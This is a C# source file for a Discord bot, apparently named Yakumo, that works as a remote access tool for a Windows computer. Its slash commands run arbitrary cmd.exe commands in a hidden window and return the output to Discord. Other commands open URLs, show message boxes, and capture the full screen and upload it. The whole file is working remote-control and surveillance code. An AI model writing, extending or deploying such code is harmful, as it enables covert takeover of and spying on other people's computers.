using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using DSharpPlus.SlashCommands;
using DSharpPlus.Entities;
using DSharpPlus;
using System.Threading;

namespace Yakumo.Commands.Slash
{

    public class SlashCommands : ApplicationCommandModule
    {
        [SlashCommand("ping", "Ping the computer to see if the connection is established.")]
        public async Task Ping(InteractionContext ctx)
        {
            await ctx.CreateResponseAsync("pong");
        }

        [SlashCommand("close", "Close the connection with the bot.")]
        public async Task Close(InteractionContext ctx)
        {
            System.Environment.Exit(1);

            await ctx.CreateResponseAsync("Done");
        }

        [SlashCommand("cmd", "Use a command on the computer console.")]
        public async Task Cmd(InteractionContext ctx, [Option("Command", "Command to execute.")] string cmd)
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };

                using (var process = Process.Start(processInfo))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    if(!string.IsNullOrEmpty(output))
                    {
                        await ctx.CreateResponseAsync($"```\n{output}\n```");
                    }

                    if(!string.IsNullOrEmpty(error))
                    {
                        await ctx.CreateResponseAsync($"```\n{error}\n```");
                    }
                }
            }
            catch(Exception ex)
            {
                await ctx.CreateResponseAsync($"Error: {ex.Message}");
            }
        }

        [SlashCommand("open", "Open an URL.")]
        public async Task Open(InteractionContext ctx, [Option("URL", "URL to website.")] string url)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true,
                });

                await ctx.CreateResponseAsync("Done");
            } 
            catch(Exception ex)
            {
                await ctx.CreateResponseAsync($"Error: {ex.Message}");
            }
        }

        [SlashCommand("message", "Send a message to the computer.")]
        public async Task Message(InteractionContext ctx, [Option("text", "Message text")] string text, [Option("caption", "Message caption")] string caption)
        {
            try
            {
                Thread thread = new Thread(() =>
                {
                    Form dummyForm = new Form { TopMost = true };
                    MessageBox.Show(dummyForm, text, caption);

                    dummyForm.Dispose();
                });

                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();

                await ctx.CreateResponseAsync("Done");
            }
            catch(Exception ex)
            {
                await ctx.CreateResponseAsync($"Error: {ex.Message}");
            }
        }

        [SlashCommand("screenshot", "Take and send screenshot.")]
        public async Task Screenshot(InteractionContext ctx)
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;

                using (Bitmap bmp = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    }

                    string filePath = "screenshot.png";
                    bmp.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);

                    await ctx.CreateResponseAsync(InteractionResponseType.DeferredChannelMessageWithSource);

                    var fileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Open);
                    var messageBuilder = new DiscordFollowupMessageBuilder()
                        .AddFile("screenshot.png", fileStream);

                    await ctx.EditResponseAsync(new DiscordWebhookBuilder().AddEmbed(
                        new DiscordEmbedBuilder()
                        .WithTitle("Screenshot")
                        .WithImageUrl("attachment://screenshot.png")
                        .Build()));

                    await ctx.FollowUpAsync(messageBuilder);

                    fileStream.Close();
                }
            }
            catch (Exception ex)
            {
                await ctx.CreateResponseAsync($"Error: {ex.Message}");
            }
        }
    }
}
